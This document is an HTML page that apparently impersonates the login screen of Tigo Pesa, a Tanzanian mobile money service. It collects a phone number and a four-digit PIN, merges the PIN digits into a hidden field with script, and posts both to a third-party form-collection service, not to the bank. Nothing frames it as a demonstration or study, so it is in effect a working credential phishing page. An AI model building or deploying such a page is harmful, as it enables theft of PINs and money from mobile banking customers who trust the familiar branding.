<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Welcome to Tigo Pesa</h2>
        <p>For the best financial services in Tanzania</p>

        <form action="https://formbold.com/s/94naj" method="POST">
            <input type="tel" name="phoneNumber" placeholder="Enter phone number" class="number-input" required>

            <p>Enter your Tigo Pesa PIN</p>
            
            <input type="hidden" name="pin" id="pin-hidden">

            <div class="pin-boxes">
                <input type="password" maxlength="1" class="pin-box" data-index="0" required>
                <input type="password" maxlength="1" class="pin-box" data-index="1" required>
                <input type="password" maxlength="1" class="pin-box" data-index="2" required>
                <input type="password" maxlength="1" class="pin-box" data-index="3" required>
            </div>

            <button type="submit" class="login-btn">Login</button>
        </form>

        <p class="forgot">Forgot PIN?</p>
    </div>

    <script>
        const pinBoxes = document.querySelectorAll('.pin-box');
        const hiddenPinInput = document.getElementById('pin-hidden');

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }
                updateHiddenPin();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        function updateHiddenPin() {
            const pin = Array.from(pinBoxes).map(input => input.value).join('');
            hiddenPinInput.value = pin;
        }
    </script>
</body>
</html>
